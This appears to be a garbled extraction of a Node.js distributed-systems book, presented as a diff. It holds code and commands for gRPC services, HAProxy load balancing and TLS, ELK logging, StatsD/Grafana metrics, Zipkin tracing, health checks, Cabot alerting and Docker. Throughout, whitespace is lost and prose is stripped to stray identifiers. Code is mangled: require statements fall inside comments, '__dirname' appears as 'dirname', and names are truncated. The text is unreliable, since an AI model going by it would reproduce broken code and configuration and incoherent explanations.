@@ -1,0 +1,3705 @@
+
+example    2-14.recipe-api/producer-grpc.js
+#!/usr/bin/env node
+
+//npm install@grpc/grpc-js@1.1@grpc/proto-loader@0.5 const grpc=require('@grpc/grpc-js');
+const loader=require('@grpc/proto-loader');const pkg_def=loader.loadSync(dirname+
+'/../shared/grpc-recipe.proto');
+const recipe=grpc.loadPackageDefinition(pkg_def).recipe;const HOST=process.env.HOST||'127.0.0.1';
+const PORT=process.env.PORT||4000;const server=new grpc.Server();
+server.addService(recipe.RecipeService.service,{getMetaData:(_call,cb)=>{
+cb(null,{
+pid:process.pid,
+});
+},
+getRecipe:(call,cb)=>{
+
+if(call.request.id!==42){
+return cb(new Error(`unknown recipe${call.request.id}`));
+}
+cb(null,{
+id:42,name:"Chicken Tikka Masala",steps:"Throw it in a pot...",ingredients:[
+{id:1,name:"Chicken",quantity:"1 lb",},
+{id:2,name:"Sauce",quantity:"2 cups",}
+]
+});
+},
+});
+
+server.bindAsync(`${HOST}:${PORT}`,grpc.ServerCredentials.createInsecure(),(err,port)=>{
+if(err)throw err;server.start();
+console.log(`Producer running at http://${HOST}:${port}/`);
+});
+
+
+
+example    2-15.web-api/consumer-grpc.js
+#!/usr/bin/env node
+
+//npm install@grpc/grpc-js@1.1@grpc/proto-loader@0.5fastify@3.2const util=require('util');
+const grpc=require('@grpc/grpc-js');const server=require('fastify')();
+const loader=require('@grpc/proto-loader');const pkg_def=loader.loadSync(dirname+
+'/../shared/grpc-recipe.proto');
+const recipe=grpc.loadPackageDefinition(pkg_def).recipe;const HOST='127.0.0.1';
+const PORT=process.env.PORT||3000;
+const TARGET=process.env.TARGET||'localhost:4000';
+
+const client=new recipe.RecipeService(TARGET,
+grpc.credentials.createInsecure()
+);
+const getMetaData=util.promisify(client.getMetaData.bind(client));const getRecipe=util.promisify(client.getRecipe.bind(client));
+
+server.get('/',async()=>{
+const[meta,recipe]=await Promise.all([getMetaData({}),
+getRecipe({id:42}),
+]);
+
+return{
+consumer_pid:process.pid,producer_data:meta,recipe
+};
+});
+
+server.listen(PORT,HOST,()=>{
+console.log(`Consumer running at http://${HOST}:${PORT}/`);});
+
+
+
+    
+example    3-1.recipe-api/producer-http-basic-master.js
+#!/usr/bin/env node
+const cluster=require('cluster');console.log(`master pid=${process.pid}`);cluster.setupMaster({
+exec:dirname+'/producer-http-basic.js'
+});
+cluster.fork();cluster.fork();
+
+cluster
+.on('disconnect',(worker)=>{console.log('disconnect',worker.id);
+})
+.on('exit',(worker,code,signal)=>{console.log('exit',worker.id,code,signal);
+//cluster.fork();
+})
+.on('listening',(worker,{address,port})=>{
+
+console.log('listening',worker.id,`${address}:${port}`);
+});
+    
+example    3-2.cluster-fibonacci.js
+    #!/usr/bin/env node
+
+//npm installfastify@3.2
+const server=require('fastify')();
+const HOST=process.env.HOST||'127.0.0.1';const PORT=process.env.PORT||4000;
+console.log(`worker pid=${process.pid}`);server.get('/:limit',async(req,reply)=>{
+return String(fibonacci(Number(req.params.limit)));
+});
+
+server.listen(PORT,HOST,()=>{
+console.log(`Producer running at http://${HOST}:${PORT}`);
+});
+
+function fibonacci(limit){let prev=1n,next=0n,swap;while(limit){
+swap=prev;
+prev=prev+next;next=swap;
+limit--;
+}
+return next;
+}[
+example    3-2. cluster-fibonacci.js
+#!/usr/bin/env node
+
+// npm install fastify@3.2
+const server = require('fastify')();
+const HOST = process.env.HOST || '127.0.0.1'; const PORT = process.env.PORT || 4000;
+console.log(`worker pid=${process.pid}`); server.get('/:limit', async (req, reply) => { 
+return String(fibonacci(Number(req.params.limit)));
+});
+
+server.listen(PORT, HOST, () => {
+console.log(`Producer running at http://${HOST}:${PORT}`);
+});
+
+function fibonacci(limit) {  let prev = 1n, next = 0n, swap; while (limit) {
+swap = prev;
+prev = prev + next; next = swap;
+limit--;
+}
+return next;
+}
+
+
+npm install -g autocannon@6	# terminal 1
+$ node master-fibonacci.js	# terminal 1
+$ autocannon -c 2 http://127.0.0.1:4000/100000
+
+
+]
+       
+example    3-3.haproxy/stats.cfg
+frontend inboundmode http
+bind localhost:8000 stats enable
+stats uri/admin?stats
+    
+
+
+example    3-4.web-api/consumer-http-healthendpoint.js(truncated)
+server.get('/health',async()=>{console.log('health check');return'OK';
+});
+    haproxy/load-balance.cfg         
+example    3-5.haproxy/load-balance.cfg
+defaultsmode http
+timeout connect 5000mstimeout client 50000ms timeout server 50000ms
+
+frontend inbound
+bind localhost:3000 default_backend web-apistats enable
+stats uri/admin?stats
+
+backend web-api
+option httpchk GET/health
+server web-api-1 localhost:3001 checkserver web-api-2 localhost:3002 check
+
+    
+Compression
+    
+example    3-6.haproxy/compression.cfg
+defaults mode http
+timeout connect 5000ms timeout client 50000ms timeout server 50000ms
+
+frontend inbound
+bind localhost:3000 default_backend web-api
+
+backend web-api compression offloadcompression algo gzip
+compression type application/json text/plainserver web-api-1
+     
+example    3-7.Generating a.pem file
+$openssl req-nodes-new-x509\
+-keyout haproxy/private.key\
+-out haproxy/certificate.cert
+$cat haproxy/certificate.cert haproxy/private.key\
+>haproxy/combined.pem
+    inbound     combined.pem     
+example    3-8.haproxy/tls.cfg
+defaults mode http
+timeout connect 5000ms timeout client 50000ms timeout server 50000ms
+
+global
+tune.ssl.default-dh-param 2048
+
+frontend inbound
+bind localhost:3000 ssl crt haproxy/combined.pemdefault_backend web-api
+
+backend web-api
+server web-api-1 localhost:3001
+  
+example    3-9.low-connections.js
+#!/usr/bin/env node
+
+const http=require('http');
+
+const server=http.createServer((req,res)=>{console.log('current conn',server._connections);setTimeout(()=>res.end('OK'),10_000);
+});
+
+server.maxConnections=2;server.listen(3020,'localhost');
+      
+
+ 
+example    3-10.haproxy/backpressure.cfg
+defaults maxconn 8mode http
+
+frontend inbound
+bind localhost:3010 default_backend web-api
+
+backend web-api option httpclose
+server web-api-1 localhost:3020 maxconn 2
+
+        
+  
+    
+example    3-1.benchmark/native-http.js
+#!/usr/bin/env node
+
+const HOST=process.env.HOST||'127.0.0.1';const PORT=process.env.PORT||4000;
+
+require("http").createServer((req,res)=>{res.end('ok');
+}).listen(PORT,()=>{
+console.log(`Producer running at http://${HOST}:${PORT}`);
+});
+    
+   
+    
+Table 3-8.Autocannon detailed latency results
+
+Percentile	Latency	Percentile	Latency	Percentile	Latency
+0.001%	0ms	10%	0ms	97.5%	0ms
+0.01%	0ms	25%	0ms	99%	0ms
+0.1%	0ms	50%	0ms	99.9%	1ms
+1%	0ms	75%	0ms	99.99%	2ms
+2.5%	0ms	90%	0ms	99.999%	3ms
+
+    
+Figure 3-5.Autocannon latency results graph
+
+    
+    
+Reverse Proxy Concerns
+    Establishing a baseline
+    benchmark/native-http.js     
+example    3-12.haproxy/benchmark-basic.cfg
+defaults mode http
+
+frontend inbound
+bind localhost:4001 default_backend native-http
+
+backend native-http
+server native-http-1 localhost:4000
+    
+$node benchmark/native-http.js
+$haproxy-f haproxy/benchmark-basic.cfg
+$autocannon-d 60-c 10-l http://localhost:4001
+
+    
+    
+
+
+
+HTTP compression
+
+Figure 3-6.HAProxy latency
+
+    mode tcp     haproxy/passthru.cfg     
+example    3-13.haproxy/passthru.cfg
+defaults mode tcp
+timeout connect 5000ms timeout client 50000ms timeout server 50000ms
+
+frontend inbound
+bind localhost:3000
+
+default_backend server-api
+
+backend server-api
+server server-api-1 localhost:3001
+    server-gzip.js         console.log     haproxy/compression.cfg         haproxy/passthru.cfg
+    
+$rm index.html;curl-o index.html https://thomashunter.name
+$PORT=3001 node server-gzip.js
+$haproxy-f haproxy/passthru.cfg
+$autocannon-H"Accept-Encoding:gzip"\
+  -d 60-c 10-l http://localhost:3000/#Node.js#Kill the previous haproxy process
+$haproxy-f haproxy/compression.cfg
+$autocannon-H"Accept-Encoding:gzip"\
+-d 60-c 10-l http://localhost:3000/#HAProxy
+
+    
+
+Figure 3-7.Node.js gzip compression latency
+
+    
+
+
+
+TLS termination
+
+Figure 3-8.HAProxy gzip compression latency
+
+        recipe-api/producer-https-basic.js     console.log     
+$PORT=3001 node recipe-api/producer-https-basic.js
+$haproxy-f haproxy/passthru.cfg
+$autocannon-d 60-c 10 https://localhost:3000/recipes/42
+
+    
+Table 3-9.Native Node.js TLS termination throughput
+
+Stat	1%	2.5%	50%	97.5%	Avg	Stdev	Min
+
+Req/Sec	7,263	11,991	13,231 18,655	13,580.7 1,833.58 7,263
+
+
+    recipe-api/producer-http-basic.js         console.log     haproxy/tls.cfg         
+$PORT=3001 node recipe-api/producer-http-basic.js
+$haproxy-f haproxy/tls.cfg
+$autocannon-d 60-c 10 https://localhost:3000/recipes/42
+
+    
+Table 3-10.HAProxy TLS termination throughput
+
+Stat 1%2.5%50%97.5%Avg Stdev Min
+
+
+    
+Protocol Concerns
+    
+    web-api     
+Figure 3-9.Benchmarking in the cloud
+
+    
+example   s/    web-api     TARGET     <RECIPE_API_IP>    recipe-api     JSON over HTTP benchmarks
+    recipe-api/producer-http-basic.js         web-api/consumer-http-basic.js         
+#Server VPS
+$HOST=0.0.0.0 node recipe-api/producer-http-basic.js#Client VPS
+$TARGET=<RECIPE_API_IP>:4000 node web-api/consumer-http-basic.js
+
+$autocannon-d 60-c 10-l http://localhost:3000
+
+    
+Figure 3-10.Benchmarking JSON over HTTP
+
+GraphQL benchmarks
+    recipe-api/producer-graphql.js         web-api/consumer-graphql.js         
+#Server VPS
+$HOST=0.0.0.0 node recipe-api/producer-graphql.js#Client VPS
+$TARGET=<RECIPE_API_IP>:4000 node web-api/consumer-graphql.js
+$autocannon-d 60-c 10-l http://localhost:3000
+
+    
+
+
+
+gRPC benchmarks
+
+Figure 3-11.Benchmarking GraphQL
+
+    recipe-api/producer-grpc.js         web-api/consumer-grpc.js         
+#Server VPS
+$HOST=0.0.0.0 node recipe-api/producer-grpc.js#Client VPS
+$TARGET=<RECIPE_API_IP>:4000 node web-api/consumer-grpc.js
+$autocannon-d 60-c 10-l http://localhost:3000
+
+    
+
+
+
+Conclusion
+
+Figure 3-12.Benchmarking gRPC
+
+    JSON.stringify()    Buffer     
+Coming Up with SLOs
+    also     noisy neighbor    
+    
+Figure 3-13.Benchmarking a production application
+
+    
+    -R     cluster-fibonacci.js     haproxy/fibonacci.cfg     
+example    3-14.haproxy/fibonacci.cfg
+defaults mode http
+
+frontend inbound
+bind localhost:5000 default_backend fibonacci
+
+backend fibonacci
+  server fibonacci-1 localhost:5001#server fibonacci-2 localhost:5002#server fibonacci-3 localhost:5003
+
+    sleep()    
+//Add this line inside the server.get async handler await sleep(10);
+
+//Add this function to the end of the file function sleep(ms){
+return new Promise(resolve=>setTimeout(resolve,ms));
+}
+
+    cluster-fibonacci.js    
+$PORT=5001 node cluster-fibonacci.js#later run with 5002&5003
+$haproxy-f haproxy/fibonacci.cfg
+$autocannon-d 60-c 10-R 10 http://localhost:5000/10000
+
+    -R     haproxy/fibonacci.cfg     cluster-fibonacci.js    PORT     5002    
+Table 3-1.Fibonacci SLO
+
+Instance count 1 2 3
+
+
+    
+    README     
+
+1	The fork()method name is inspired by the fork system call,though the two are technically unrelated.
+2	More advanced applications might have some race-conditions unearthed when running multiple copies.
+3	This backend has a balance<algorithm>directive implicitely set to roundrobin.It can be set to leastconn to route requests to the instance with the fewest connections,source to consistently route a client by IP to an instance,and several other algorithm options are also available.
+4	You�ll need to manually refresh it any time you want to see updated statistics;the page only displays a static snapshot.
+5Regardless of performance,it�s necessary that services exposed to the internet are encrypted.
+
+Chapter 4.Observability
+
+
+    console.log()    console.log()    
+Environments
+Environments     production     NODE_ENV     
+$export NODE_ENV=production
+$node server.js
+
+    what     which     Development
+    stdout     Staging
+    production     staging     Production
+    staging    staging     production     
+    staging     preprod    
+Logging with ELK
+ELK    the ELK stack    Elasticsearch    Logstash    Kibana    Elasticsearch
+    :9200    Logstash
+    :7777    Kibana
+    :5601    
+    
+Figure 4-1.The ELK stack
+
+    
+    
+Running ELK via Docker
+    misc/elk/udp.conf    -v     
+example    4-1.misc/elk/udp.conf
+input{udp{
+id=>"nodejs_udp_logs"port=>7777
+codec=>json
+}
+}
+output{elasticsearch{
+hosts=>["localhost:9200"]document_type=>"nodelog"manage_template=>false
+index=>"nodejs-%{+YYYY.MM.dd}"
+}
+}
+
+
+    sysctl     -e     sysctl     
+example    4-2.Running ELK within Docker
+$sudo sysctl-w vm.max_map_count=262144#Linux Only
+$docker run-p 5601:5601-p 9200:9200\
+-p 5044:5044-p 7777:7777/udp\
+-v$PWD/misc/elk/udp.conf:/etc/logstash/conf.d/99-input-udp.conf\
+-e MAX_MAP_COUNT=262144\
+-it--name distnode-elk sebp/elk:683
+    http://localhost:5601     
+Transmitting Logs from Node.js
+            
+example    4-3.web-ap    js
+#!/usr/bin/env node
+
+//npm i    node-fetch@2.6middie@5.1const server=require('fastify')();
+const fetch=require('node-fetch');
+const HOST=process.env.HOST||'127.0.0.1';const PORT=process.env.PORT||3000;
+const TARGET=process.env.TARGET||'localhost:4000';const log=require('./logstash.js');
+
+(async()=>{
+await server.register(require('middie'));server.use((req,res,next)=>{
+log('info','request-incoming',{
+path:req.url,method:req.method,ip:req.ip,ua:req.headers['user-agent']||null});
+
+next();
+});
+server.setErrorHandler(async(error,req)=>{log('error','request-failure',{stack:error.stack,
+  path:req.url,method:req.method,});return{error:error.message};
+});
+server.get('/',async()=>{
+const url=`http://${TARGET}/recipes/42`;
+log('info','request-outgoing',{url,svc:'recipe-api'});const req=await fetch(url);
+const producer_data=await req.json();
+return{consumer_pid:process.pid,producer_data};
+});
+server.get('/error',async()=>{throw new Error('oh no');});server.listen(PORT,HOST,()=>{
+log('verbose','listen',{host:HOST,port:PORT});
+});
+})();
+    logstash.js         middie             recipe-api     logstash.js     @log4js-node/logstashudp     
+    web-api/logstash.js    
+example    4-4.web-api/logstash.js
+const client=require('dgram').createSocket('udp4');const host=require('os').hostname();
+const[LS_HOST,LS_PORT]=process.env.LOGSTASH.split(':');const NODE_ENV=process.env.NODE_ENV;
+
+module.exports=function(severity,type,fields){const payload=JSON.stringify({
+'@timestamp':(new Date()).toISOString(),
+"@version":1,app:'web-api',environment:NODE_ENV,severity,type,fields,host
+});
+console.log(payload);client.send(payload,LS_PORT,LS_HOST);
+};
+    dgram         LOGSTASH    
+    @timestamp    app     severity     type    fields
+    severity     log level     error    warn    info    verbose    debug    silly    verbose    debug     silly    logstash.js     
+    web-api     recipe-api     web-api    web-api     watch     
+example    4-5.Running web-api and generating logs
+$NODE_ENV=development LOGSTASH=localhost:7777\node web-api/consumer-http-logs.js
+$node recipe-api/producer-http-basic.js
+$brew install watch#required for macOS
+$watch-n5 curl http://localhost:3000
+$watch-n13 curl http://localhost:3000/error
+    watch     
+Creating a Kibana Dashboard
+    http://localhost:5601    nodejs-*    
+    @timestamp     nodejs-*    
+Figure 4-2.Kibana visualizations
+
+    nodejs-*    nodejs-*
+    web-api     type    is    request-incoming     app    is
+    web-api    
+    @timestamp     
+Figure 4-3.Requests over time in Kibana
+
+    web-api incoming requests    type     request-outgoing     web-api outgoing requests    type     listen     web-api server starts    web-api overview    
+Running Ad-Hoc Queries
+    
+app:"web-api"AND(severity:"error"OR severity:"warn")
+
+    Kibana Query Language    web-api     severity     error     warn    PUT/recipe     
+
+
+
+
+    
+
+
+Metrics with Graphite,StatsD,and Grafana
+    
+    metrics    2XX     5XX     Graphite    StatsD    Grafana    Graphite
+    Carbon    Whisper    Graphite Web    StatsD
+    Grafana
+    
+    
+Figure 4-4.Graphite,StatsD,and Grafana
+
+    
+    
+Running via Docker
+    graphiteapp/graphite-statsd     :8080    :8125    grafana/grafana    :8000    
+example    4-6.Running StatsD+Graphite,and Grafana
+$docker run\
+-p 8080:80\
+-p 8125:8125/udp\
+-it--name distnode-graphite graphiteapp/graphite-statsd:1.1.6-1
+$docker run\
+-p 8000:3000\
+-it--name distnode-grafana grafana/grafana:6.5.2
+    http://localhost:8000/    admin    admin    
+Table 4-1.Configuring Grafana to use Graphite
+
+Name	Dist Node Graphite
+
+
+
+
+    
+Transmitting Metrics from Node.js
+    foo.bar.baz     
+foo.bar.baz:1|c
+
+    dgram     statsd-client
+    
+    web-api/consumer-http-basic.js         web-api/consumer-http-metrics.js         npm install     
+example    4-7.web-api/consumer-http-metrics.js(first half)
+#!/usr/bin/env node
+
+//npm installfastify@3.2node-fetch@2.6statsd-client@0.4.4middie@5.1const server=require('fastify')();
+const fetch=require('node-fetch');const HOST='127.0.0.1';
+const PORT=process.env.PORT||3000;
+const TARGET=process.env.TARGET||'localhost:4000';const SDC=require('statsd-client');
+const statsd=new(require('statsd-client'))({host:'localhost',port:8125,prefix:'web-api'});
+
+(async()=>{
+await server.register(require('middie'));server.use(statsd.helpers.getExpressMiddleware('inbound',{
+  timeByUrl:true}));server.get('/',async()=>{
+const begin=new Date();
+const req=await fetch(`http://${TARGET}/recipes/42`);statsd.timing('outbound.recipe-api.request-time',begin);statsd.increment('outbound.recipe-api.request-count');const producer_data=await req.json();
+
+return{consumer_pid:process.pid,producer_data};
+});
+server.get('/error',async()=>{throw new Error('oh no');});server.listen(PORT,HOST,()=>{
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+});
+})();
+    web-api        recipe-api        
+    
+statsd-client     localhost:8125    web-api    recipe-api    statsd-client     Express    inbound     web-api     recipe-api     recipe-api     outbound.recipe-api.request-time    outbound.recipe-
+api.request-count    recipe-api     
+$NODE_DEBUG=statsd-client node web-api/consumer-http-metrics.js
+$node recipe-api/producer-http-basic.js
+$autocannon-d 300-R 5-c 1 http://localhost:3000
+$watch-n1 curl http://localhost:3000/error
+
+    
+Creating a Grafana Dashboard
+
+    web-api     recipe-api    recipe-api     web-api     recipe-api     stats_count     web-api    inbound    response_code    *    *    Function     
+aliasByNode(stats_counts.web-api.inbound.response_code.*,4)
+
+    recipe-api    
+aliasByNode(stats.timers.web-api.outbound.*.request-time.upper_90,4)
+
+
+    
+aliasByNode(stats_counts.web-api.outbound.*.request-count,3)
+
+    
+    
+Figure 4-5.Completed Grafana dashboard
+
+Node.js Health Indicators
+    web-api/consumer-http-metrics.js     Gauges    
+example    4-8.web-api/consumer-http-metrics.js(second half)
+const v8=require('v8');const fs=require('fs');
+
+setInterval(()=>{
+statsd.gauge('server.conn',server.server._connections);
+
+const m=process.memoryUsage();statsd.gauge('server.memory.used',m.heapUsed);statsd.gauge('server.memory.total',m.heapTotal);
+
+const h=v8.getHeapStatistics();statsd.gauge('server.heap.size',h.used_heap_size);statsd.gauge('server.heap.limit',h.heap_size_limit);
+
+fs.readdir('/proc/self/fd',(err,list)=>{if(err)return;
+statsd.gauge('server.descriptors',list.length);
+});
+
+const begin=new Date();
+setTimeout(()=>{statsd.timing('eventlag',begin);},0);
+},10_000);
+            stats.gauges    stats.timers    server.conn    server.memory.used     server.memory.total    
+    setTimeout()    
+Figure 4-6.Updated Grafana dashboard
+
+    
+
+
+
+
+Distributed Request Tracing with Zipkin
+    web-api     recipe-api     user-api     user-store     web-api     recipe-api     web-api     user-api     user-store     
+    request ID    request_id     Zipkin    OpenZipkin    
+How Does Zipkin Work?
+    
+
+Figure 4-7.
+example    requests and Zipkin data
+
+    server message    client message    
+[{
+
+"id":	"0000000000000111",
+"traceId":"0000000000000100",
+"parentId":"0000000000000110",
+"timestamp":1579221096510000,
+"name":"get_recipe","duration":80000,"kind":"CLIENT","localEndpoint":{
+"serviceName":"web-api","ipv4":"127.0.0.1","port":100
+},
+"remoteEndpoint":{"ipv4":"127.0.0.2","port":200},"tags":{
+"http.method":"GET","http.path":"/recipe/42","diagram":"C2"
+}
+}]
+
+    id    traceId    parentId     timestamp     duration     wall clock    Date.now()        kind     CLIENT     SERVER    name     localEndpoint     SERVER     CLIENT     remoteEndpoint     SERVER     port    name    tags     http.method     http.path    
+    
+Table 4-2.Values reported fromFigure 4-7
+
+Message	id	parentId	traceId	kind
+S1	110	N/A	100	SERVER
+C2	111	110	100	CLIENT
+S2	111	110	100	SERVER
+C3	121	110	100	CLIENT
+S3	121	110	100	SERVER
+C4	122	121	100	CLIENT
+S4	122	121	100	SERVER
+
+    X-B3-TraceId
+    trace    request ID    
+X-B3-SpanId
+    span     
+X-B3-ParentSpanId
+    parent span     
+    
+X-B3-Sampled
+    
+X-B3-Flags
+    
+    
+Running Zipkin via Docker
+    9411     
+
+$docker run-p 9411:9411\
+-it--name distnode-zipkin\openzipkin/zipkin-slim:2.19
+
+Transmitting Traces from Node.js
+            
+example    4-9.web-ap    n.js
+#!/usr/bin/env node
+
+//npm    node-fetch@2.6zipkin-lite@0.1const server=require('fastify')();
+const fetch=require('node-fetch');
+const HOST=process.env.HOST||'127.0.0.1';const PORT=process.env.PORT||3000;
+const TARGET=process.env.TARGET||'localhost:4000';const ZIPKIN=process.env.ZIPKIN||'localhost:9411';const Zipkin=require('zipkin-lite');
+const zipkin=new Zipkin({zipkinHost:ZIPKIN,
+serviceName:'web-api',servicePort:PORT,serviceIp:HOST,init:'short'
+});
+server.addHook('onRequest',zipkin.onRequest());server.addHook('onResponse',zipkin.onResponse());
+
+server.get('/',async(req)=>{req.zipkin.setName('get_root');
+
+const url=`http://${TARGET}/recipes/42`;const zreq=req.zipkin.prepare();
+const recipe=await fetch(url,{headers:zreq.headers});zreq.complete('GET',url);
+const producer_data=await recipe.json();
+
+return{pid:process.pid,producer_data,trace:req.zipkin.trace};
+});
+
+server.listen(PORT,HOST,()=>{
+console.log(`Consumer running at http://${HOST}:${PORT}/`);
+});
+    zipkin-lite     web-api         
+
+
+    init     serviceName    servicePort    serviceIp     onRequest     onResponse     zipkin-lite     onRequest     req.zipkin     onResponse     SERVER     req.zipkin.setName()    req.zipkin.prepare()    zreq    zreq.headers    zreq.complete()    CLIENT     web-api     recipe-api    recipe-api/producer-http-basic.js         recipe-api/producer-http-zipkin.js     
+example    4-10.recipe-api/producer-http-zipkin.js(truncated)
+const PORT=process.env.PORT||4000;
+const ZIPKIN=process.env.ZIPKIN||'localhost:9411';const Zipkin=require('zipkin-lite');
+const zipkin=new Zipkin({zipkinHost:ZIPKIN,
+serviceName:'recipe-api',servicePort:PORT,serviceIp:HOST,
+});
+server.addHook('onRequest',zipkin.onRequest());server.addHook('onResponse',zipkin.onResponse());
+
+server.get('/recipes/:id',async(req,reply)=>{req.zipkin.setName('get_recipe');
+const id=Number(req.params.id);
+
+    init     web-api     req.zipkin.prepare()    recipe-api     npm installzipkin-lite@0.1    web-api     
+$node recipe-api/producer-http-zipkin.js
+$node web-api/consumer-http-zipkin.js
+$curl http://localhost:3000/
+
+    trace    curl     e232bb26a7941aab    
+Visualizing a Request Tree
+
+    
+http://localhost:9411/zipkin/
+
+    curl     
+Figure 4-8.Zipkin discover interface
+
+    SERVER     
+    web-api     get_root    recipe-api     get_recipe    user-api     user-store    
+Figure 4-9.
+example    Zipkin trace timeline
+
+    
+Visualizing Microservice Dependencies
+    
+    web-api    recipe-api    
+Figure 4-10.
+example    Zipkin dependency view
+
+    
+
+
+
+
+Health Checks
+    liveness     degraded    
+    setInterval()    Consul     
+Building a Health Check
+    
+example    4-1.Running Postgres and Redis
+$docker run\
+--rm\
+-p 5432:5432\
+-e POSTGRES_PASSWORD=hunter2\
+-e POSTGRES_USER=tmp\
+-e POSTGRES_DB=tmp\postgres:12.3
+$docker run\
+--rm\
+-p 6379:6379\
+redis:6.0
+    basic-http-healthcheck.js    
+
+example    4-12.basic-http-healthcheck.js
+#!/usr/bin/env node
+
+//npm installfastify@3.2ioredis@4.17pg@8.3const server=require('fastify')();
+const HOST='0.0.0.0';
+const PORT=3300;
+const redis=new(require("ioredis"))({enableOfflineQueue:false});const pg=new(require('pg').Client)();
+pg.connect();//Note:Postgres will not reconnect on failure
+
+server.get('/health',async(req,reply)=>{try{
+const res=await pg.query('SELECT$1::text as status',['ACK']);if(res.rows[0].status!=='ACK')reply.code(500).send('DOWN');
+}catch(e){reply.code(500).send('DOWN');
+}
+//...other down checks...let status='OK';
+try{
+if(await redis.ping()!=='PONG')status='DEGRADED';
+}catch(e){
+status='DEGRADED';
+}
+//...other degraded checks...reply.code(200).send(status);
+});
+
+server.listen(PORT,HOST,()=>console.log(`http://${HOST}:${PORT}/`));
+            
+    ioredis     pg     ioredis     enableOfflineQueue     true    false    
+    pg     why     
+$PGUSER=tmp PGPASSWORD=hunter2 PGDATABASE=tmp\node basic-http-healthcheck.js
+
+    pg     
+Testing the Health Check
+    
+$curl-v http://localhost:3300/health
+
+    OK     ioredis     exponential backoff     curl     DEGRADED    curl    DEGRADED     OK     ioredis     pg     ioredis     
+Alerting with Cabot
+    
+        Twilio     
+
+
+Create a Twilio Trial Account
+        Account SID    AC     Auth Token    
+    Trial Number    +15551234567    Verified Number    Verified Caller ID     
+Running Cabot via Docker
+    Docker Compose     
+$git clone git@github.com:cabotapp/docker-cabot.git cabot
+$cd cabot
+$git checkout 1f846b96
+
+    conf/production.env     distributed-node     
+example    4-13.config/production.env
+TIME_ZONE=America/Los_AngelesADMIN_EMAIL=admin@
+example   .orgCABOT_FROM_EMAIL=cabot@
+example   .orgDJANGO_SECRET_KEY=abcd1234
+WWW_HTTP_HOST=localhost:5000 WWW_SCHEME=http
+
+#GRAPHITE_API=http://<YOUR-IP-ADDRESS>:8080/
+
+TWILIO_ACCOUNT_SID=<YOUR_TWILIO_ACCOUNT_SID>TWILIO_AUTH_TOKEN=<YOUR_TWILIO_AUTH_TOKEN>TWILIO_OUTGOING_NUMBER=<YOUR_TWILIO_NUMBER>
+            
+
+
+    
+$docker-compose up
+
+    
+Creating a Health Check
+    basic-http-healthcheck.js     /health     http://localhost:5000    
+    admin    admin     
+Table 4-3.Fields for creating a service in Cabot
+
+Name	Dist Node Service
+
+
+    <LOCAL_IP>    
+Table 4-4.Fields for creating an HTTP check in Cabot
+
+Name	Dist Node HTTP Health
+
+
+Active	checked
+
+
+    admin     
+Sent from your Twilio trial account-Service Dist Node Service reporting CRITICAL status:http://localhost:5000/service/1/
+
+    
+    
+Figure 4-11.Cabot service status screenshot
+
+    
+$docker rm cabot_postgres_1 cabot_rabbitmq_1\cabot_worker_1 cabot_beat_1 cabot_web_1
+
+
+    pagerduty     
+
+
+1	Note that process.hrtime()is only useful for getting relative time and can�t be used to get the current time with microsecond accuracy.
+2This 
+example    doesn�t persist data to disk and isn�t appropriate for production use.
+
+Chapter 5.Containers
+
+
+    .js     node     and     Resizer Service A     Resizer Service B    ImageMagick v7    ImageMagick v5    Virtual machines    
+    Containers     classic     virtual machines    host OS     guest OS    containers    
+
+
+
+
+
+Figure 5-1.Classic versus virtual machines versus containers
+
+    
+Introduction to Docker
+    dockerd     docker     
+    /usr/bin    node     npm     .js     node_modules     Docker Desktop     Dockerfile    FROM     FROM
+alpine:3.11     alpine     3.11     FROM node:lts-alpine3.11     
+    FROM     layer    git     
+
+Figure 5-2.Images contain layers,and layers contribute to the filesystem
+
+    docker run     npm install     
+$docker images
+
+    
+REPOSITORY	TAG	IMAGE ID	CREATED	SIZE
+
+grafana/grafana	6.5.2	7a40c3c56100	8	weeks ago	228MB
+grafana/grafana	latest	7a40c3c56100	8	weeks ago	228MB
+openzipkin/zipkin	latest	12ee1ce53834	2	months ago	157MB
+openzipkin/zipkin-slim	2.19	c9db4427dbdd	2	months ago	124MB
+graphiteapp/graphite-statsd	1.1.6-1	5881ff30f9a5	3	months ago	423MB
+sebp/elk	latest	99e6d3f782ad	4	months ago	2.06GB
+
+    sebp/elk    TAG     latest    when it was last downloaded from the registry    <none>    image ID    grafana/grafana     6.5.2     latest     latest     
+$docker history grafana/grafana:6.5.2
+
+    
+IMAGE	CREATED BY	SIZE
+7a40c3c56100/bin/sh-c#(nop)ENTRYPOINT["/run.sh"]	0B
+<missing>	/bin/sh-c#(nop)USER grafana	0B
+<missing>	/bin/sh-c#(nop)COPY file:3e1dfb34fa628163�	3.35kB
+<missing>	/bin/sh-c#(nop)EXPOSE 3000	0B
+<missing>	|2 GF_GID=472 GF_UID=472/bin/sh-c mkdir-p�	28.5kB
+<missing>	/bin/sh-c#(nop)COPY dir:200fe8c0cffc35297�	177MB
+
+<missing>	|2 GF_GID=472 GF_UID=472/bin/sh-c if[`ar�	18.7MB
+<missing>	|2 GF_GID=472 GF_UID=472/bin/sh-c if[`ar�	15.6MB
+<missing>	|2 GF_GID=472 GF_UID=472/bin/sh-c apk add�	10.6MB
+...<TRUNCATED RESULTS>...
+<missing>	/bin/sh-c#(nop)ADD file:fe1f09249227e2da2�	5.55MB
+
+    docker history     docker pull     
+$docker pull node:lts-alpine
+
+    
+lts-alpine:Pulling from library/node c9b1b535fdd9:Pull complete
+750cdd924064:Downloading[=====>	]2.485MB/24.28MB
+2078ab7cf9df:Download complete 02f523899354:Download complete
+
+    docker pull node:lts     
+    
+
+
+    bash     
+$docker run-it--rm--name ephemeral ubuntu/bin/bash
+
+    -i     -t     -it    --rm
+    --name
+    ubuntu     ubuntu:latest    /bin/bash     ps-e    
+PID TTY	TIME CMD
+1 pts/0	00:00:00 bash
+10 pts/0	00:00:00 ps
+
+    bash    ps    service manager     systemd     init    bash     sidecar process     
+$docker ps
+
+    ps     things    
+
+CONTAINER ID IMAGE	COMMAND	CREATED	PORTS NAMES
+527847ba22f8 ubuntu"/bin/bash"	11 minutes ago	ephemeral
+
+    exec    docker exec ephemeral/bin/ls/var     exit    --rm     docker ps     docker ps--all     ephemeral     
+
+
+    -v    --
+volume     --mount     -p    --publish     
+    index.html     
+$rm index.html;curl-o index.htmlhttp://
+example   .org
+$docker run--rm-p 8080:80\
+-v$PWD:/usr/share/nginx/html nginx
+
+    volume     publish     -p 8080:80    -v$PWD:/usr/share/nginx/html     -v     $PWD     .    http://localhost:8080/    index.html     volume mount     volume     
+
+Containerizing a Node.js Service
